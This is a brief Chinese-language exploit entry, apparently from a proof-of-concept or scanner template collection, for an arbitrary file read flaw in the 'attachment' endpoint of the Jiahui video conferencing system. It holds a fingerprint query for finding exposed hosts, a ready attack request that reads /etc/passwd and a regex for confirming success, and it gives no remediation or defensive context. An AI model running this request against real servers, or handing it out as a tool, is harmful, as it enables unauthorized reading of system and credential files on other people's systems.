# 佳会视频会议attachment任意文件读取

佳会视频会议attachment ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/user/get_app_scheme?site_id="`
- **请求**：`GET /attachment?file=/etc/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$